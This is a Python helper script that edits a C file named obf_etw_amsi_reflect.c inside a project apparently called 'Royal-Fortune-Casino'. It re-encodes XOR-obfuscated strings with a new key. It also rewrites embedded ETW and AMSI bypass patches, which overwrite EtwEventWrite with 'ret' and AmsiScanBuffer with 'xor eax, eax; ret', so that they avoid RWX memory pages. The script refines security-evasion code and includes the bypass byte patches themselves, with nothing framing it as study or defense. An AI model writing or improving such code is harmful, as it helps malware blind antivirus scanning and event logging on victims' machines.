#!/usr/bin/env python3
import re

XOR_KEY_OLD = 0x7A
XOR_KEY_NEW = 0xA5

def read_file(path):
    with open(path, 'r') as f:
        return f.read()

def write_file(path, content):
    with open(path, 'w') as f:
        f.write(content)

def xor_encode(s, key):
    return [ord(c) ^ key for c in s]

def format_array(bytes_list):
    if len(bytes_list) <= 12:
        return '{' + ', '.join(f'0x{b:02x}' for b in bytes_list) + '}'
    lines = []
    for i in range(0, len(bytes_list), 8):
        chunk = bytes_list[i:i+8]
        line = '    ' + ', '.join(f'0x{b:02x}' for b in chunk)
        if i + 8 < len(bytes_list):
            line += ','
        lines.append(line)
    return '{\n' + '\n'.join(lines) + '\n}'

def transform(content):
    # 1. Re-encode all arrays with new XOR key
    pattern = r'/\*\s*"([^"]+)"\s*\*/\s*\nstatic unsigned char (enc_\w+)\[\]\s*=\s*\{[^}]+\};'
    
    def replace_array(match):
        original_str = match.group(1)
        array_name = match.group(2)
        encoded = xor_encode(original_str, XOR_KEY_NEW)
        formatted = format_array(encoded)
        return f'/* "{original_str}" */\nstatic unsigned char {array_name}[] = {formatted};'
    
    content = re.sub(pattern, replace_array, content)
    
    # 2. Fix off-by-one: sizeof(enc_xxx)-1 → sizeof(enc_xxx)
    content = re.sub(r'sizeof\((enc_\w+)\)-1', r'sizeof(\1)', content)
    content = re.sub(r'sizeof\((enc_\w+)\) - 1', r'sizeof(\1)', content)
    content = re.sub(r'sizeof\((enc_\w+)\)- 1', r'sizeof(\1)', content)
    
    # 3. Fix RWX VirtualProtect → RW then RX
    # ETW bypass
    content = content.replace(
        '''if (!VirtualProtect(pEtwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect)) return;
    
    *(unsigned char*)pEtwEventWrite = 0xC3; /* ret */
    
    VirtualProtect(pEtwEventWrite, 1, oldProtect, &oldProtect);''',
        '''if (!VirtualProtect(pEtwEventWrite, 1, PAGE_READWRITE, &oldProtect)) return;
    
    *(unsigned char*)pEtwEventWrite = 0xC3; /* ret */
    
    VirtualProtect(pEtwEventWrite, 1, PAGE_EXECUTE_READ, &oldProtect);'''
    )
    
    # AMSI bypass
    content = content.replace(
        '''if (!VirtualProtect(pAmsiScanBuffer, 3, PAGE_EXECUTE_READWRITE, &oldProtect)) return;
    
    unsigned char patch[] = {0x31, 0xC0, 0xC3}; /* xor eax, eax; ret */
    memcpy(pAmsiScanBuffer, patch, 3);
    
    VirtualProtect(pAmsiScanBuffer, 3, oldProtect, &oldProtect);''',
        '''if (!VirtualProtect(pAmsiScanBuffer, 3, PAGE_READWRITE, &oldProtect)) return;
    
    unsigned char patch[] = {0x31, 0xC0, 0xC3}; /* xor eax, eax; ret */
    memcpy(pAmsiScanBuffer, patch, 3);
    
    VirtualProtect(pAmsiScanBuffer, 3, PAGE_EXECUTE_READ, &oldProtect);'''
    )
    
    return content

def main():
    import sys
    path = sys.argv[1] if len(sys.argv) > 1 else '/Users/Jakin/Royal-Fortune-Casino/src/utils/obf_etw_amsi_reflect.c'
    content = read_file(path)
    new_content = transform(content)
    write_file(path, new_content)
    print("Transformed obf_etw_amsi_reflect.c")

if __name__ == '__main__':
    main()
